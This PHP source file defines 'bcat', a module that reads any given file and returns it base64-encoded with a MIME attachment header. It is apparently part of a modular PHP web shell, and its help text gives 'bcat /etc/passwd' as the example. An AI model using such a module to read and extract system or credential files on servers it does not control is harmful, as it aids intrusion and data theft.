<?php

/**
 * ModuleBcat - Wyswietlanie zawartosci pliku w base64
 */
class ModuleBcat implements ShellInterface
{
	/**
	 * Obiekt Shell
	 *
	 * @access private
	 * @var    object
	 */
	private $oShell;

	/**
	 * Konstruktor
	 *
	 * @access public
	 * @param  object $oShell Obiekt Shell
	 * @return void
	 */
	public function __construct( Shell $oShell )
	{
		$this -> oShell = $oShell;
	}

	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array
		(
			'bcat',
			'b64'
		);
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.0 2011-06-04 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Wyświetlanie zawartości pliku przy użyciu base64

	Użycie:
		bcat ścieżka_do_pliku

	Przykład:
		bcat /etc/passwd
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Help
		 */
		if( $this -> oShell -> iArgc === 0 )
		{
			return $this -> getHelp();
		}

		/**
		 * Plik zrodlowy musi istniec
		 */
		if( ! is_file( $this -> oShell -> sArgv ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> oShell -> sArgv );
		}

		/**
		 * Naglowek Mime i zrodlo pliku w base64
		 */
		$sMime = sprintf( "MIME-Version: 1.0\r\nContent-Type: application/octet-stream; name=\"%s\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"%s\"\r\n\r\n",
			basename( $this -> oShell -> sArgv ), basename( $this -> oShell -> sArgv )
		);

		return htmlspecialchars( $sMime . chunk_split( base64_encode( file_get_contents( $this -> oShell -> sArgv ) ), 130 ) );
	}

}